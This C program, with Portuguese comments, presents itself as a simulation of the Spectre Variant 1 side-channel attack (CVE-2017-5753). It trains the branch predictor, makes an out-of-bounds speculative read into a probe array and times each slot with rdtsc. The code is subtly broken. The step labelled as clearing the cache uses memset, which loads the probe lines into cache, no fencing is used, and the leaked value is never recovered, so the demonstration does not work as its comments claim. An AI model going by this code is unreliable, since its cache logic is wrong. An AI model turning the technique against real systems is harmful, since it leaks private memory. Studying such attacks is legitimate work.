/*
 * Simulação Spectre (Variante 1) - CVE-2017-5753
 */

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <time.h>
#include <stdlib.h>

#define CACHE_HIT_THRESHOLD 80 // Limite para considerar cache hit (em ciclos)

// Função para medir tempo de acesso (em ciclos de clock)
static inline uint64_t rdtsc()
{
    unsigned int lo, hi;
    asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

// Função vítima que simula acesso condicional
void victim_function(size_t x, uint8_t *array1, size_t array1_size, uint8_t *array2)
{
    if (x < array1_size)
    {
        uint8_t value = array1[x];
        uint8_t temp = array2[value * 512]; // Acesso que deixa rastro no cache
        (void)temp;                         // Evitar warning de variável não usada
    }
}

// Treina o branch predictor
void train_branch_predictor(uint8_t *array1, size_t array1_size, uint8_t *array2)
{
    for (int i = 0; i < 10; i++)
    {
        victim_function(5, array1, array1_size, array2); // Sempre com índice válido
    }
}

int main()
{

    // Configuração dos arrays
    size_t array1_size = 16;
    uint8_t array1[16] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16};

    // Array grande para detectar padrões de cache
    uint8_t *array2 = malloc(256 * 512);
    memset(array2, 0, 256 * 512);

    train_branch_predictor(array1, array1_size, array2);

    // Tenta acessar além dos limites (será bloqueado pelo if, mas pode especular)
    size_t malicious_x = array1_size + 5; // Índice inválido

    // Limpa o cache de array2 primeiro
    for (int i = 0; i < 256; i++)
    {
        memset(&array2[i * 512], 0, 512);
    }

    // Chama a função que pode ser especulada
    victim_function(malicious_x, array1, array1_size, array2);

    // Mede tempos de acesso - em sistema real mostraria padrão
    int results[256];
    for (int i = 0; i < 256; i++)
    {
        uint64_t time1 = rdtsc();
        uint8_t temp = array2[i * 512];
        (void)temp;
        uint64_t time2 = rdtsc();
        results[i] = (int)(time2 - time1);
    }

    for (int i = 0; i < 20; i++)
    { // Mostra só os primeiros
        printf("array2[%d*512]: ~%d ciclos\n", i, results[i]);
    }

    free(array2);
    return 0;
}